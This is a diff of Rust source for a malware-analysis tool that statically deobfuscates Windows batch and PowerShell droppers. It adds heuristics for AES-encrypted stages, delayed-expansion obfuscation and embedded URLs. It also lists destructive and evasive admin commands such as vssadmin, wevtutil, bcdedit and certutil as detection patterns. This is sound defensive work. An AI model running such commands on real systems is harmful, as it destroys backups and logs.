+fn looks_like_scaffold_arithmetic_expr(expr: &str) -> bool {
+    let Some((lhs, rhs)) = expr.split_once('=') else {
+        return false;
+    };
+    let lhs = lhs.trim().trim_matches('"');
+    let rhs = rhs.trim();
+    lhs.len() >= 2
+        && lhs.len() <= 16
+        && lhs.starts_with('_')
+        && lhs.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_')
+        && !rhs.is_empty()
+        && rhs
+            .bytes()
+            .all(|b| b.is_ascii_hexdigit() || b" \t()+-*/%&|^~<>xX".contains(&b))
+}
+
+fn looks_like_dispatch_arithmetic_expr(expr: &str) -> bool {
+    let Some((lhs, rhs)) = expr.split_once('=') else {
+        return false;
+    };
+    let lhs = lhs.trim();
+    let rhs = rhs.trim();
+    !lhs.is_empty()
+        && lhs.len() <= 16
+        && lhs.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_')
+        && rhs.len() >= 3
+        && rhs
+            .bytes()
+            .all(|b| b.is_ascii_hexdigit() || b" \t()+-*/%&|^~<>xX".contains(&b))
+}
+
+fn collapse_repeated_line_truncation_traits(traits: &mut Vec<Trait>) {
+    let mut first_idx = None;
+    let mut count = 0usize;
+    let mut max_original_len = 0u64;
+    for (idx, trait_) in traits.iter().enumerate() {
+        let Trait::LineTruncated { original_len } = trait_ else {
+            continue;
+        };
+        first_idx.get_or_insert(idx);
+        count += 1;
+        max_original_len = max_original_len.max(*original_len);
+    }
+    if count <= 1 {
+        return;
+    }
+    let Some(first_idx) = first_idx else {
+        return;
+    };
+
+    let mut collapsed = Vec::with_capacity(traits.len() - count + 1);
+    for (idx, trait_) in std::mem::take(traits).into_iter().enumerate() {
+        if matches!(trait_, Trait::LineTruncated { .. }) {
+            if idx == first_idx {
+                collapsed.push(Trait::LineTruncated {
+                    original_len: max_original_len,
+                });
+            }
+        } else {
+            collapsed.push(trait_);
+        }
+    }
+    *traits = collapsed;
+}
+
+fn summarize_dense_admin_cleanup_traits(
+    traits: &mut Vec<Trait>,
+    total: u64,
+    max_per_kind: u32,
+) -> bool {
+    const MIN_DENSE_ADMIN_TOTAL: u64 = 96;
+    const REPRESENTATIVE_KEEP: u64 = 16;
+
+    if total < MIN_DENSE_ADMIN_TOTAL || total <= u64::from(max_per_kind) {
+        return false;
+    }
+
+    let admin_count = traits
+        .iter()
+        .filter(|t| matches!(t, Trait::AdminCommand { .. }))
+        .count() as u64;
+    if admin_count < REPRESENTATIVE_KEEP {
+        return false;
+    }
+
+    let cleanup_count = traits
+        .iter()
+        .filter(|t| match t {
+            Trait::AdminCommand { name, cmd } => is_dense_admin_cleanup_command(name, cmd),
+            _ => false,
+        })
+        .count() as u64;
+    if cleanup_count.saturating_mul(4) < admin_count.saturating_mul(3) {
+        return false;
+    }
+
+    let mut kept_admin = 0u64;
+    traits.retain(|t| match t {
+        Trait::AdminCommand { name, cmd } if is_dense_admin_cleanup_command(name, cmd) => {
+            kept_admin += 1;
+            kept_admin <= REPRESENTATIVE_KEEP
+        }
+        Trait::TraitsCapped { capped_kind, .. } if capped_kind == "AdminCommand" => false,
+        Trait::AdminCommandSummary { category, .. } if category == "dense-admin-cleanup" => false,
+        _ => true,
+    });
+
+    let kept = traits
+        .iter()
+        .filter(|t| matches!(t, Trait::AdminCommand { .. }))
+        .count() as u64;
+    traits.push(Trait::AdminCommandSummary {
+        category: "dense-admin-cleanup".to_string(),
+        total,
+        kept,
+    });
+    true
+}
+
+fn is_dense_admin_cleanup_command(name: &str, cmd: &str) -> bool {
+    let name = name.trim().to_ascii_lowercase();
+    if matches!(
+        name.as_str(),
+        "taskkill"
+            | "reg"
+            | "rmdir"
+            | "rd"
+            | "del"
+            | "erase"
+            | "sc"
+            | "wevtutil"
+            | "vssadmin"
+            | "bcdedit"
+            | "wbadmin"
+            | "fsutil"
+            | "netsh"
+            | "ipconfig"
+            | "timeout"
+            | "ping"
+            | "certutil"
+    ) {
+        return true;
+    }
+
+    let cmd = cmd.trim_start().to_ascii_lowercase();
+    cmd.starts_with("rundll32.exe inet")
+        || cmd.contains("\\temp")
+        || cmd.contains("appdata\\local")
+        || cmd.contains("$recycle.bin")
 }
 
 fn dedup_traits(traits: &mut Vec<Trait>, max_per_kind: u32) {
@@ -9333,6 +12965,22 @@ fn dedup_traits(traits: &mut Vec<Trait>, max_per_kind: u32) {
             Trait::Download { src, dst: None, .. } if launch_urls.contains(src)
         )
     });
+    let download_urls_with_dst: std::collections::HashSet<String> = traits
+        .iter()
+        .filter_map(|t| match t {
+            Trait::Download {
+                src, dst: Some(_), ..
+            } => Some(src.clone()),
+            _ => None,
+        })
+        .collect();
+    traits.retain(|t| {
+        !matches!(
+            t,
+            Trait::Download { src, dst: None, .. } if download_urls_with_dst.contains(src)
+        )
+    });
+    drop_prefix_download_artifacts(traits);
     let mut semantic_seen = std::collections::HashSet::new();
     traits.retain(|t| {
         let Some(key) = semantic_dedup_key(t) else {
@@ -9347,6 +12995,18 @@ fn dedup_traits(traits: &mut Vec<Trait>, max_per_kind: u32) {
         };
         exact_seen.insert(key)
     });
+    collapse_numeric_label_dispatch_traits(traits);
+    collapse_arithmetic_scaffolding_traits(traits);
+    collapse_repeated_line_truncation_traits(traits);
+    let admin_cap_total = traits.iter().find_map(|t| match t {
+        Trait::TraitsCapped {
+            capped_kind, total, ..
+        } if capped_kind == "AdminCommand" => Some(*total),
+        _ => None,
+    });
+    if let Some(total) = admin_cap_total {
+        summarize_dense_admin_cleanup_traits(traits, total, max_per_kind);
+    }
     // Count by kind
     let mut counts: std::collections::BTreeMap<String, u64> = std::collections::BTreeMap::new();
     for t in traits.iter() {
@@ -9375,6 +13035,95 @@ fn dedup_traits(traits: &mut Vec<Trait>, max_per_kind: u32) {
             });
         }
     }
+}
+
+fn drop_prefix_download_artifacts(traits: &mut Vec<Trait>) {
+    let downloads: Vec<(usize, &str, String, &str)> = traits
+        .iter()
+        .enumerate()
+        .filter_map(|(idx, t)| match t {
+            Trait::Download {
+                cmd,
+                src,
+                dst: Some(dst),
+            } => Some((
+                idx,
+                cmd.as_str(),
+                canonical_download_dst_for_dedup(dst),
+                src.as_str(),
+            )),
+            _ => None,
+        })
+        .collect();
+    if downloads.len() < 2 {
+        return;
+    }
+
+    let mut drop = vec![false; traits.len()];
+    for (idx, cmd, dst, src) in &downloads {
+        if drop[*idx] {
+            continue;
+        }
+        for (other_idx, other_cmd, other_dst, other_src) in &downloads {
+            if idx == other_idx || cmd != other_cmd || dst != other_dst {
+                continue;
+            }
+            if other_src.len() > src.len()
+                && other_src.starts_with(src)
+                && download_prefix_artifact_boundary(other_src, src.len())
+            {
+                drop[*idx] = true;
+                break;
+            }
+        }
+    }
+
+    let mut idx = 0usize;
+    traits.retain(|_| {
+        let keep = !drop[idx];
+        idx += 1;
+        keep
+    });
+}
+
+fn download_prefix_artifact_boundary(longer: &str, prefix_len: usize) -> bool {
+    longer[prefix_len..]
+        .bytes()
+        .next()
+        .is_some_and(|b| b.is_ascii_whitespace())
+}
+
+fn reconcile_live_trait_caps(traits: &mut Vec<Trait>, admin_command_total: u64, max_per_kind: u32) {
+    if admin_command_total <= u64::from(max_per_kind) {
+        return;
+    }
+    if summarize_dense_admin_cleanup_traits(traits, admin_command_total, max_per_kind) {
+        return;
+    }
+    let kept = traits
+        .iter()
+        .filter(|t| matches!(t, Trait::AdminCommand { .. }))
+        .count() as u64;
+    if let Some(Trait::TraitsCapped {
+        capped_kind,
+        total,
+        kept: existing_kept,
+    }) = traits.iter_mut().find(|t| {
+        matches!(
+            t,
+            Trait::TraitsCapped { capped_kind, .. } if capped_kind == "AdminCommand"
+        )
+    }) {
+        *capped_kind = "AdminCommand".to_string();
+        *total = (*total).max(admin_command_total);
+        *existing_kept = (*existing_kept).min(kept);
+        return;
+    }
+    traits.push(Trait::TraitsCapped {
+        capped_kind: "AdminCommand".to_string(),
+        total: admin_command_total,
+        kept,
+    });
 }
 
 /// Detect a binary file format that the input *starts with*. Skips PE
@@ -9446,6 +13195,10 @@ fn looks_like_pe(content: &[u8]) -> bool {
 }
 
 fn scan_binary_input_urls(input: &[u8], env: &mut Environment) {
+    const MAX_BINARY_URL_SCAN_BYTES: usize = 16 * 1024 * 1024;
+    const MAX_FULL_BINARY_URL_SCAN_BYTES: usize = 4 * 1024 * 1024;
+    const LARGE_BINARY_URL_SCAN_EDGE_BYTES: usize = 512 * 1024;
+
     let mut known: std::collections::HashSet<String> = env
         .traits
         .iter()
@@ -9459,29 +13212,17 @@ fn scan_binary_input_urls(input: &[u8], env: &mut Environment) {
             _ => None,
         })
         .collect();
-    for url in aes_chain::scan::scan_urls(input, 16) {
-        if deob_scan::is_noise_url(&url) || !known.insert(url.clone()) {
-            continue;
-        }
-        if let Some(host) = deob_scan::ip_discovery_host_from_url(&url) {
-            let target = host.to_string();
-            if !env.traits.iter().any(|t| {
-                matches!(
-                    t,
-                    Trait::NetworkProbe { probe_kind, target: existing_target }
-                        if probe_kind == "ip-discovery" && existing_target == &target
-                )
-            }) {
-                env.traits.push(Trait::NetworkProbe {
-                    probe_kind: "ip-discovery".to_string(),
-                    target,
-                });
-            }
-        }
-        env.traits.push(Trait::DownloadInDeobText {
-            src: url,
-            line_hint: "binary-input".to_string(),
-        });
+    let mut scan_end = input.len();
+    while scan_end > 0 && input[scan_end - 1] == 0 {
+        scan_end -= 1;
+    }
+    let scan_input = &input[..scan_end.min(MAX_BINARY_URL_SCAN_BYTES)];
+    if scan_input.len() <= MAX_FULL_BINARY_URL_SCAN_BYTES {
+        scan_binary_url_window(scan_input, env, &mut known);
+    } else {
+        let edge = LARGE_BINARY_URL_SCAN_EDGE_BYTES.min(scan_input.len());
+        scan_binary_url_window(&scan_input[..edge], env, &mut known);
+        scan_binary_url_window(&scan_input[scan_input.len() - edge..], env, &mut known);
     }
     // bat/CAB dual-detonation pattern: a CAB file whose header area
     // embeds a batch payload like
@@ -9510,6 +13251,37 @@ fn scan_binary_input_urls(input: &[u8], env: &mut Environment) {
     }
     if run.len() >= 24 {
         deob_scan::scan_deob_text(&run, env);
+    }
+}
+
+fn scan_binary_url_window(
+    input: &[u8],
+    env: &mut Environment,
+    known: &mut std::collections::HashSet<String>,
+) {
+    for url in aes_chain::scan::scan_urls(input, 16) {
+        if deob_scan::is_noise_url(&url) || !known.insert(url.clone()) {
+            continue;
+        }
+        if let Some(host) = deob_scan::ip_discovery_host_from_url(&url) {
+            let target = host.to_string();
+            if !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::NetworkProbe { probe_kind, target: existing_target }
+                        if probe_kind == "ip-discovery" && existing_target == &target
+                )
+            }) {
+                env.traits.push(Trait::NetworkProbe {
+                    probe_kind: "ip-discovery".to_string(),
+                    target,
+                });
+            }
+        }
+        env.traits.push(Trait::DownloadInDeobText {
+            src: url,
+            line_hint: "binary-input".to_string(),
+        });
     }
 }
 
@@ -9544,6 +13316,27 @@ fn looks_like_batch(content: &[u8]) -> bool {
     markers
         .iter()
         .any(|m| crate::util::contains_ascii_case_insensitive(&text, m))
+}
+
+fn decoded_payload_is_batch_script(dst: &str, content: &[u8]) -> bool {
+    let lower_dst = dst.to_ascii_lowercase();
+    if lower_dst.ends_with(".vbs")
+        || lower_dst.ends_with(".vbe")
+        || lower_dst.ends_with(".js")
+        || lower_dst.ends_with(".jse")
+        || lower_dst.ends_with(".hta")
+    {
+        return false;
+    }
+    if lower_dst.ends_with(".bat") || lower_dst.ends_with(".cmd") {
+        return true;
+    }
+    let text = String::from_utf8_lossy(content);
+    let lower = text.to_ascii_lowercase();
+    if looks_like_vbs_script(&lower) || looks_like_js_script(&lower) {
+        return false;
+    }
+    looks_like_batch(content)
 }
 
 /// Pre-scan for the grouped-output-redirect idiom that base64-blob droppers
@@ -9643,6 +13436,8 @@ fn has_echo_redirect_prescan_shape(input: &[u8]) -> bool {
 }
 
 fn capture_block_echo_redirects(lines: &[String], env: &mut Environment) {
+    const GROUPED_ECHO_PRESCAN_MAX_TEXT_BYTES: usize = 1024 * 1024;
+
     // Pre-scan runs BEFORE the main interpreter, so env doesn't yet have
     // any `set _t=…` definitions from preceding lines. We need those so
     // the redirect target (`> "%_t%"`) can be var-expanded into the same
@@ -9653,6 +13448,9 @@ fn capture_block_echo_redirects(lines: &[String], env: &mut Environment) {
     let mut scratch = env.clone();
     let mut i = 0usize;
     while i < lines.len() {
+        if env.check_timeout() {
+            return;
+        }
         // Apply any leading SET lines so the redirect target expands.
         let stripped = lines[i].trim_start_matches(['@', ' ', '\t']);
         if is_block_set_line(stripped) {
@@ -9744,6 +13542,13 @@ fn capture_block_echo_redirects(lines: &[String], env: &mut Environment) {
         // CMD's normal newline; `set /p` prompts do not.
         let mut content = String::new();
         for p in &payloads {
+            if env.check_timeout() {
+                return;
+            }
+            if p.text.len() > GROUPED_ECHO_PRESCAN_MAX_TEXT_BYTES {
+                env.note_timeout();
+                return;
+            }
             let toks = lex::lex(&p.text);
             // Same scratch env as the target — keeps echo bodies that
             // reference earlier SET vars (`echo %url% > file`) consistent
@@ -9841,9 +13646,8 @@ fn analyze_extracted_payloads(env: &mut Environment, depth: u32) {
     use std::collections::HashSet;
     use std::hash::{Hash, Hasher};
 
-    fn content_fingerprint(dst: &str, content: &[u8]) -> u64 {
+    fn content_fingerprint(content: &[u8]) -> u64 {
         let mut hasher = std::collections::hash_map::DefaultHasher::new();
-        dst.hash(&mut hasher);
         content.hash(&mut hasher);
         hasher.finish()
     }
@@ -9859,7 +13663,9 @@ fn analyze_extracted_payloads(env: &mut Environment, depth: u32) {
             .filter_map(|(k, v)| {
                 let content = match v {
                     env::FsEntry::Decoded { content, .. } => Some(content.clone()),
-                    env::FsEntry::Content { content, .. } if looks_like_batch(content) => {
+                    env::FsEntry::Content { content, .. }
+                        if decoded_payload_is_batch_script(k, content) =>
+                    {
                         Some(content.clone())
                     }
                     _ => None,
@@ -9875,14 +13681,22 @@ fn analyze_extracted_payloads(env: &mut Environment, depth: u32) {
 
         let mut processed_any = false;
         for (dst, content) in candidates {
-            if !looks_like_batch(&content) {
+            if !decoded_payload_is_batch_script(&dst, &content) {
                 continue;
             }
-            let fp = content_fingerprint(&dst, &content);
+            let fp = content_fingerprint(&content);
             if !seen.insert(fp) {
                 continue;
             }
             processed_any = true;
+            let decoded_text = String::from_utf8_lossy(&content).into_owned();
+            if !env
+                .all_extracted_cmd
+                .iter()
+                .any(|existing| existing == &decoded_text)
+            {
+                env.all_extracted_cmd.push(decoded_text.clone());
+            }
             env.traits.push(Trait::RecursiveAnalysis {
                 dst: dst.clone(),
                 depth,
@@ -9896,7 +13710,6 @@ fn analyze_extracted_payloads(env: &mut Environment, depth: u32) {
                 drive(&content, env, &mut child_out);
                 env.input_bytes = prev_input_bytes;
             }
-            let decoded_text = String::from_utf8_lossy(&content).into_owned();
             let self_iex = {
                 (crate::util::contains_ascii_case_insensitive(&decoded_text, "readalltext")
                     || crate::util::contains_ascii_case_insensitive(&decoded_text, "get-content"))
@@ -9909,8 +13722,8 @@ fn analyze_extracted_payloads(env: &mut Environment, depth: u32) {
                             "invoke-expression",
                         ))
             };
-            if self_iex && !env.all_extracted_ps1.contains(&content) {
-                env.all_extracted_ps1.push(content.clone());
+            if self_iex {
+                push_extracted_ps1_for_later_analysis(content.clone(), env);
             }
             deob_scan::scan_deob_text(&decoded_text, env);
             deob_scan::scan_deob_text(&child_out, env);
@@ -9928,6 +13741,107 @@ fn analyze_extracted_payloads(env: &mut Environment, depth: u32) {
     walk(env, depth, &mut HashSet::new());
 }
 
+const MAX_DIRECT_EXTRACTED_PS1_BYTES: usize = 256 * 1024;
+
+fn push_extracted_ps1_for_later_analysis(payload: Vec<u8>, env: &mut Environment) {
+    if payload.len() <= MAX_DIRECT_EXTRACTED_PS1_BYTES {
+        env.push_extracted_ps1(payload);
+        return;
+    }
+
+    rescue_truncated_urls(&String::from_utf8_lossy(&payload), payload.len(), env);
+    if let Some(extracted) = peel_tail_base64_powershell_wrapper(&payload) {
+        env.push_extracted_ps1(extracted);
+    }
+}
+
+fn should_run_aes_chain(_raw_text: &str, deob: &str, env: &Environment) -> bool {
+    env.traits
+        .iter()
+        .any(|t| matches!(t, Trait::MultiStageEncryptedDropper { .. }))
+        || text_has_aes_chain_hint(deob)
+        || env.traits.iter().any(|t| match t {
+            Trait::EchoRedirect { content, .. } => {
+                text_has_aes_chain_hint(&String::from_utf8_lossy(content))
+            }
+            _ => false,
+        })
+}
+
+fn skip_large_raw_self_read_aes_chain(raw_input: &[u8], deob: &str) -> bool {
+    const LARGE_SELF_READ_AES_RAW_BYTES: usize = 8 * 1024 * 1024;
+
+    raw_input.len() > LARGE_SELF_READ_AES_RAW_BYTES
+        && !raw_has_self_marker_aes_payload_envelope(raw_input)
+        && text_has_aes_chain_hint(deob)
+        && text_has_powershell_self_read_hint(deob)
+        && crate::util::contains_ascii_case_insensitive(deob, "gzipstream")
+        && crate::util::contains_ascii_case_insensitive(deob, "assembly]::")
+}
+
+fn raw_has_self_marker_aes_payload_envelope(raw_input: &[u8]) -> bool {
+    raw_input.split(|&b| b == b'\n').any(|line| {
+        let line = line.strip_suffix(b"\r").unwrap_or(line);
+        line.starts_with(b":: ") || matches!(line.get(..4), Some(prefix) if prefix.starts_with(b":::") && prefix[3].is_ascii_digit())
+    })
+}
+
+fn text_has_powershell_self_read_hint(text: &str) -> bool {
+    crate::util::contains_ascii_case_insensitive(text, "readalltext")
+        || crate::util::contains_ascii_case_insensitive(text, "txeTllAdaeR")
+}
+
+fn aes_scan_key(text: &str) -> u64 {
+    use std::hash::{Hash, Hasher};
+
+    let mut hasher = std::collections::hash_map::DefaultHasher::new();
+    text.hash(&mut hasher);
+    hasher.finish()
+}
+
+fn text_has_aes_chain_hint(text: &str) -> bool {
+    crate::util::contains_ascii_case_insensitive(text, "aesmanaged")
+        || crate::util::contains_ascii_case_insensitive(text, "rijndael")
+        || crate::util::contains_ascii_case_insensitive(text, "transformfinalblock")
+        || crate::util::contains_ascii_case_insensitive(text, "cryptography.aes")
+        || (crate::util::contains_ascii_case_insensitive(text, "frombase64string")
+            && crate::util::contains_ascii_case_insensitive(text, ".key")
+            && crate::util::contains_ascii_case_insensitive(text, ".iv"))
+        || text_has_fragmented_aes_chain_hint(text)
+}
+
+fn text_has_fragmented_aes_chain_hint(text: &str) -> bool {
+    let compact: String = text
+        .chars()
+        .filter_map(|ch| match ch {
+            '\'' | '"' | '+' | '`' if ch.is_ascii() => None,
+            ch if ch.is_ascii_whitespace() => None,
+            ch => Some(ch.to_ascii_lowercase()),
+        })
+        .collect();
+
+    compact.contains("aesmanaged")
+        || compact.contains("rijndael")
+        || compact.contains("transformfinalblock")
+        || compact.contains("cryptography.aes")
+        || (compact.contains("frombase64string")
+            && compact.contains(".key")
+            && compact.contains(".iv"))
+}
+
+const RAW_EMBEDDED_POWERSHELL_SCAN_MAX_BYTES: usize = 1024 * 1024;
+
+fn should_scan_raw_embedded_powershell(raw_text: &str, deob: &str) -> bool {
+    raw_text.len() <= RAW_EMBEDDED_POWERSHELL_SCAN_MAX_BYTES
+        || (!text_has_clear_powershell_invocation(deob)
+            && text_has_clear_powershell_invocation(raw_text))
+}
+
+fn text_has_clear_powershell_invocation(text: &str) -> bool {
+    crate::util::contains_ascii_case_insensitive(text, "powershell")
+        || crate::util::contains_ascii_case_insensitive(text, "pwsh")
+}
+
 /// Heuristic: does the input contain any `!IDENT[…]!` reference (the
 /// delayed-expansion sigil — possibly with a substring/substitution tail
 /// like `!VAR:OLD=NEW!` or `!VAR:~0,1!`)? Static-analysis-only — real CMD
@@ -9935,15 +13849,201 @@ fn analyze_extracted_payloads(env: &mut Environment, depth: u32) {
 /// these. We use this as a hint to auto-enable delayed expansion when
 /// neither is explicit in the input.
 fn has_bang_var_reference(input: &[u8]) -> bool {
+    use std::collections::HashSet;
+
     use once_cell::sync::Lazy;
     use regex::bytes::Regex;
     #[expect(clippy::expect_used, reason = "static regex construction")]
     static BANG_RE: Lazy<Regex> = Lazy::new(|| {
         // `!IDENT!`  or  `!IDENT:…!`  (the `:` form is substring/substitution
         // and is just as much a delayed-expansion construct as plain `!X!`).
-        Regex::new(r"![A-Za-z_][A-Za-z0-9_]*(?:[:~][^!\r\n]{0,80})?!").expect("bang re")
+        Regex::new(r"!([A-Za-z_][A-Za-z0-9_]*)([:~][^!\r\n]{0,80})?!").expect("bang re")
     });
-    BANG_RE.is_match(input)
+    let has_clear_powershell = bytes_have_clear_powershell_invocation(input);
+    let assigned_names: HashSet<Vec<u8>> = collect_set_assignment_names_for_bang_refs(input);
+    let mut long_plain_refs = 0usize;
+    for caps in BANG_RE.captures_iter(input) {
+        if caps.get(2).is_some() {
+            return true;
+        }
+        let Some(name) = caps.get(1) else {
+            continue;
+        };
+        if assigned_names.contains(&ascii_lower_bytes(name.as_bytes())) {
+            return true;
+        }
+        if name.as_bytes().len() >= 16 {
+            long_plain_refs += 1;
+            if long_plain_refs >= 8 && !has_clear_powershell {
+                return true;
+            }
+        }
+    }
+
+    if has_percent_noisy_assigned_bang_ref(input, &assigned_names) {
+        return true;
+    }
+
+    false
+}
+
+fn has_percent_noisy_assigned_bang_ref(
+    input: &[u8],
+    assigned_names: &std::collections::HashSet<Vec<u8>>,
+) -> bool {
+    const MAX_BANG_BODY_BYTES: usize = 16 * 1024;
+
+    let mut long_noisy_refs = 0usize;
+    for line in input.split(|byte| *byte == b'\n') {
+        let line = line.strip_suffix(b"\r").unwrap_or(line);
+        let mut cursor = 0usize;
+        while let Some(rel_start) = line[cursor..].iter().position(|byte| *byte == b'!') {
+            let start = cursor + rel_start + 1;
+            let Some(rel_end) = line[start..].iter().position(|byte| *byte == b'!') else {
+                break;
+            };
+            let end = start + rel_end;
+            let body = &line[start..end];
+            cursor = end + 1;
+
+            if body.is_empty() || body.len() > MAX_BANG_BODY_BYTES || !body.contains(&b'%') {
+                continue;
+            }
+            let name = bang_ref_name_before_op(body);
+            let Some(collapsed) = strip_simple_percent_decorators_from_bytes(name) else {
+                continue;
+            };
+            if assigned_names.contains(&ascii_lower_bytes(&collapsed)) {
+                return true;
+            }
+            if collapsed.len() >= 16 {
+                long_noisy_refs += 1;
+                if long_noisy_refs >= 8 {
+                    return true;
+                }
+            }
+        }
+    }
+    false
+}
+
+fn bang_ref_name_before_op(body: &[u8]) -> &[u8] {
+    body.iter()
+        .position(|byte| matches!(*byte, b':' | b'~'))
+        .map_or(body, |idx| &body[..idx])
+}
+
+fn strip_simple_percent_decorators_from_bytes(bytes: &[u8]) -> Option<Vec<u8>> {
+    let mut out = Vec::with_capacity(bytes.len());
+    let mut cursor = 0usize;
+    let mut stripped = false;
+    while cursor < bytes.len() {
+        if bytes[cursor] != b'%' {
+            out.push(bytes[cursor]);
+            cursor += 1;
+            continue;
+        }
+        let close = bytes[cursor + 1..]
+            .iter()
+            .position(|byte| *byte == b'%')
+            .map(|offset| cursor + 1 + offset)?;
+        let name = &bytes[cursor + 1..close];
+        if name.is_empty()
+            || !name
+                .iter()
+                .all(|byte| byte.is_ascii_alphanumeric() || *byte == b'_')
+        {
+            return None;
+        }
+        stripped = true;
+        cursor = close + 1;
+    }
+    (stripped && !out.is_empty()).then_some(out)
+}
+
+fn bytes_have_clear_powershell_invocation(input: &[u8]) -> bool {
+    use once_cell::sync::Lazy;
+    use regex::bytes::Regex;
+
+    #[expect(clippy::expect_used, reason = "static regex construction")]
+    static PS_INVOKE_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(
+            r#"(?ix)
+            (^|[\s&|(<>"'])
+            (?:powershell|pwsh)(?:\.exe)?
+            ($|[\s"'/:-])
+        "#,
+        )
+        .expect("powershell invocation re")
+    });
+
+    input.split(|byte| *byte == b'\n').any(|line| {
+        let line = line.strip_suffix(b"\r").unwrap_or(line);
+        let line = trim_ascii_start_bytes(line);
+        let line = line.strip_prefix(b"@").map_or(line, trim_ascii_start_bytes);
+        if starts_with_ascii_case_insensitive_bytes(line, b"rem")
+            || line.starts_with(b"::")
+            || line.starts_with(b":")
+        {
+            return false;
+        }
+        PS_INVOKE_RE.is_match(line)
+    })
+}
+
+fn collect_set_assignment_names_for_bang_refs(input: &[u8]) -> std::collections::HashSet<Vec<u8>> {
+    input
+        .split(|byte| *byte == b'\n')
+        .filter_map(set_assignment_name_for_bang_ref_line)
+        .collect()
+}
+
+fn set_assignment_name_for_bang_ref_line(mut line: &[u8]) -> Option<Vec<u8>> {
+    line = line.strip_suffix(b"\r").unwrap_or(line);
+    line = trim_ascii_start_bytes(line);
+    while let Some(first) = line.first().copied() {
+        if matches!(first, b'@' | b'(' | b';' | b',') {
+            line = trim_ascii_start_bytes(&line[1..]);
+        } else {
+            break;
+        }
+    }
+    if line.len() < 4 || !starts_with_ascii_case_insensitive_bytes(line, b"set") {
+        return None;
+    }
+    let mut rest = &line[3..];
+    if !rest
+        .first()
+        .is_some_and(|byte| byte.is_ascii_whitespace() || *byte == b'"')
+    {
+        return None;
+    }
+    rest = trim_ascii_start_bytes(rest);
+    if rest.first() == Some(&b'/') {
+        return None;
+    }
+    if rest.first() == Some(&b'"') {
+        rest = &rest[1..];
+    }
+    let eq_idx = rest.iter().position(|byte| *byte == b'=')?;
+    let candidate = trim_ascii_bytes(&rest[..eq_idx]);
+    (!candidate.is_empty()).then(|| ascii_lower_bytes(candidate))
+}
+
+fn trim_ascii_bytes(bytes: &[u8]) -> &[u8] {
+    let start = bytes
+        .iter()
+        .position(|byte| !byte.is_ascii_whitespace())
+        .unwrap_or(bytes.len());
+    let end = bytes
+        .iter()
+        .rposition(|byte| !byte.is_ascii_whitespace())
+        .map_or(start, |idx| idx + 1);
+    &bytes[start..end]
+}
+
+fn ascii_lower_bytes(bytes: &[u8]) -> Vec<u8> {
+    bytes.iter().map(|byte| byte.to_ascii_lowercase()).collect()
 }
 
 /// `setlocal disabledelayedexpansion` is the explicit opt-out the
@@ -9994,42 +14094,56 @@ fn cap_line(line: String, env: &mut Environment) -> String {
     s
 }
 
+fn record_suppressed_line_cap(line: &str, env: &mut Environment) {
+    let limit = env.limits.max_output_line_bytes;
+    if limit == 0 || line.len() as u64 <= limit {
+        return;
+    }
+    rescue_truncated_urls(line, line.len(), env);
+    env.traits.push(crate::traits::Trait::LineTruncated {
+        original_len: line.len() as u64,
+    });
+}
+
 fn fast_expand_percent_substr_chain_line(line: &str, env: &Environment) -> Option<String> {
     if line.len() < 128 || !line.contains(":~") {
         return None;
     }
 
+    use std::collections::HashMap;
+
     let mut out = String::with_capacity(line.len().min(128 * 1024));
     let mut cursor = 0usize;
     let mut refs = 0usize;
+    let mut value_cache: HashMap<String, Option<String>> = HashMap::new();
+    let bytes = line.as_bytes();
     while cursor < line.len() {
-        let rest = &line[cursor..];
-        let Some(first) = rest.chars().next() else {
+        let Some(&first) = bytes.get(cursor) else {
             break;
         };
-        if first.is_whitespace() {
-            out.push(first);
-            cursor += first.len_utf8();
+        if first.is_ascii_whitespace() {
+            out.push(first as char);
+            cursor += 1;
             continue;
         }
-        if first != '%' {
+        if first != b'%' {
             return None;
         }
 
         let name_start = cursor + 1;
-        let after_start = &line[name_start..];
-        let close_rel = after_start.find('%')?;
-        let colon_rel = after_start.find(':');
+        let after_start = &bytes[name_start..];
+        let close_rel = after_start.iter().position(|b| *b == b'%')?;
+        let colon_rel = after_start.iter().position(|b| *b == b':');
         let Some(colon_rel) = colon_rel.filter(|colon_rel| *colon_rel < close_rel) else {
             let name_end = name_start + close_rel;
             if name_end == name_start {
                 return None;
             }
             let name = &line[name_start..name_end];
-            if name.contains(['!', '^', '&', '|', '<', '>', '"']) {
+            if percent_chain_name_has_forbidden_byte(name) {
                 return None;
             }
-            if let Some(value) = env.get(name) {
+            if let Some(value) = cached_percent_chain_value(name, env, &mut value_cache) {
                 out.push_str(&value);
             }
             refs += 1;
@@ -10044,19 +14158,352 @@ fn fast_expand_percent_substr_chain_line(line: &str, env: &Environment) -> Optio
         let op_start = name_end + 1;
         let op_end = name_start + close_rel;
         let op = &line[op_start..op_end];
-        if !op.trim_start().starts_with('~') {
+        let (index, length) =
+            parse_fast_percent_substr_op(op).or_else(|| match crate::lex::parse_substr(op)? {
+                crate::lex::VarOp::Substr { index, length } => Some((index, length)),
+                _ => None,
+            })?;
+        let name = &line[name_start..name_end];
+        if percent_chain_name_has_forbidden_byte(name) {
             return None;
         }
-        let crate::lex::VarOp::Substr { index, length } = crate::lex::parse_substr(op)? else {
-            return None;
-        };
-        let raw = env.get(&line[name_start..name_end])?;
-        out.push_str(&crate::normalize::apply_substr(&raw, index, length));
+        if let Some(raw) = cached_percent_chain_value(name, env, &mut value_cache) {
+            out.push_str(&crate::normalize::apply_substr(&raw, index, length));
+        }
         refs += 1;
         cursor = op_end + 1;
     }
 
     (refs >= 8).then_some(out)
+}
+
+fn percent_chain_name_has_forbidden_byte(name: &str) -> bool {
+    name.bytes()
+        .any(|b| matches!(b, b'!' | b'^' | b'&' | b'|' | b'<' | b'>' | b'"'))
+}
+
+fn cached_percent_chain_value(
+    name: &str,
+    env: &Environment,
+    cache: &mut std::collections::HashMap<String, Option<String>>,
+) -> Option<String> {
+    if name.eq_ignore_ascii_case("random") {
+        return env.get(name);
+    }
+    cache
+        .entry(name.to_string())
+        .or_insert_with(|| crate::normalize::env_get_for_var_expansion(env, name, true))
+        .clone()
+}
+
+fn parse_fast_percent_substr_op(op: &str) -> Option<(i64, Option<i64>)> {
+    let bytes = op.trim_start().as_bytes();
+    if bytes.first().copied() != Some(b'~') {
+        return None;
+    }
+    let mut idx = 1usize;
+    skip_fast_ascii_whitespace(bytes, &mut idx);
+    let start = parse_fast_i64(bytes, &mut idx)?;
+    skip_fast_ascii_whitespace(bytes, &mut idx);
